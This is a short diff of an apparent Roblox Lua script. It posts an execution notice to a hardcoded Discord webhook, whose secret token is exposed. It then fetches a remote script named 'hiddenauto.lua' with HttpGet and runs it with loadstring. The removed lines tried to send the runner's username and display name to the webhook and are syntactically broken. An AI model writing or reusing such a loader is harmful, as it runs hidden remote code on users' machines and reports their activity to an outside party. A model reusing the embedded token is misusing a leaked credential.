@@ -30,9 +30,7 @@ end
 local webhook_url = "https://discord.com/api/webhooks/1217348383170236467/17G9oEQYtyvAxdhgScnSLCr6K6BGvZI6Pyb9-pqEqsc2_CJW7gBhtEPSdZZThYHB3vuy"
 
 -- Send notification
-send_discord_notification(webhook_url, "@everyone Lua script executed from Roblox!")
-send_discord_notification(username, "Lua script executed by: " .. username ..")
-send_discord_notification(display_name, " .. display_name .. ")"
-  
+send_discord_notification(webhook_url, "Lua script executed from Roblox!")
+
 -- Load and execute the Lua script from the URL
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/scripts/main/hiddenauto.lua"))()
